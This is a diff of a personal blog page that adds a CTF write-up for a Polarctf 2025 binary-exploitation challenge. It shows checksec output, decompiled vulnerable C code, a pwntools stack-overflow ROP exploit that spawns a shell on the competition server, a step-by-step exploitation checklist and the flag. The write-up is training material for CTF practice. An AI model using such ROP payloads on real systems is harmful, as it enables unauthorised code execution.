@@ -232,7 +232,35 @@
         </header>
 
         <div class="post-content">
-            <h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="练习1"><a href="#练习1" class="headerlink" title="练习1*"></a>练习1<sup>*</sup></h2><p>首先拿到题目附件，先查壳，放进Exeinfo PE</p>
+            <h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="nihao"><a href="#nihao" class="headerlink" title="nihao*"></a>nihao<sup>*</sup></h2><p>先查看一下这个是什么文件</p>
+<blockquote>
+<p>$ file nihao<br>nihao: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 2.6.32, BuildID[sha1]&#x3D;c355c5c06bbfa3bc358de4b081f00517852e7487, not stripped</p>
+</blockquote>
+<p>然后checksec一下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:       amd64-64-little</span><br><span class="line">RELRO:      Partial RELRO</span><br><span class="line">Stack:      No canary found</span><br><span class="line">NX:         NX enabled</span><br><span class="line">PIE:        No PIE (0x400000)</span><br><span class="line">Stripped:   No</span><br></pre></td></tr></table></figure>
+<p>分析完成后，反汇编</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I will give you /bin/sh:&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x100u</span>LL);</span><br><span class="line">  vul();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>构造exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;1.95.36.136&quot;</span>,<span class="number">2141</span>)</span><br><span class="line"></span><br><span class="line">sys = <span class="number">0x4005e0</span></span><br><span class="line">rdi = <span class="number">0x400893</span></span><br><span class="line">bs = <span class="number">0x4008c7</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">72</span> + p64(rdi) + p64(bs) + p64(sys)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><strong>有栈溢出吗？</strong> 	→ 找gets&#x2F;scanf&#x2F;read等 </p>
+<p><strong>能覆盖返回地址吗？</strong>	→ 计算偏移量 </p>
+<p><strong>开了NX吗？</strong>	→ 需要ROP </p>
+<p><strong>开了PIE吗？</strong>	→ 需要泄露地址 </p>
+<p><strong>程序里有system吗？</strong>	→ objdump看 </p>
+<p><strong>程序里有&#x2F;bin&#x2F;sh吗？</strong>	→ strings找 </p>
+<p><strong>有pop rdi吗？</strong>	→ ROPgadget找 </p>
+<p><strong>构造payload测试</strong></p>
+<ol>
+<li>溢出 → 返回到 0x400893 (pop rdi; ret)</li>
+<li>执行 pop rdi：栈顶是 0x4008c7 → 弹到 rdi</li>
+<li>执行 ret：栈顶现在是 0x4005e0 → 跳到 system</li>
+<li>system被调用，从rdi取参数 → 得到”&#x2F;bin&#x2F;sh”地址</li>
+<li>执行 system(“&#x2F;bin&#x2F;sh”)</li>
+</ol>
+<p>flag{dbc7dff1-dd17-4655-8dcc-e5741acbae2f}</p>
+<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="练习1"><a href="#练习1" class="headerlink" title="练习1*"></a>练习1<sup>*</sup></h2><p>首先拿到题目附件，先查壳，放进Exeinfo PE</p>
 <img src="/Lsccc.github.io/2025/12/05/Polarctf-2025%E5%86%AC%E5%AD%A3%E8%B5%9B%E4%B8%8B/15.png" class="">
 
 <p>看诊断，如果为加壳，就会显示编程语言，否则会显示加壳方式，下图是未加壳时显示的编程语言</p>
@@ -435,10 +463,10 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/Lsccc.github.io/2025/12/08/%E7%A0%81%E6%9E%97%E7%A7%98%E7%B1%8D%E4%BA%8C/">码林秘籍(二)</a>
+                <a class="prev" rel="prev" href="/Lsccc.github.io/2025/12/05/Polarctf-2025%E5%86%AC%E5%AD%A3%E8%B5%9B%E4%B8%8A/">Polarctf-2025冬季赛（上）</a>
             
             
-            <a class="next" rel="next" href="/Lsccc.github.io/2025/12/05/Polarctf-2025%E5%86%AC%E5%AD%A3%E8%B5%9B%E4%B8%8A/">Polarctf-2025冬季赛（上）</a>
+            <a class="next" rel="next" href="/Lsccc.github.io/2025/12/03/%E7%A2%8E%E7%9F%A5%E8%AF%86/">碎知识</a>
             
         </section>
 
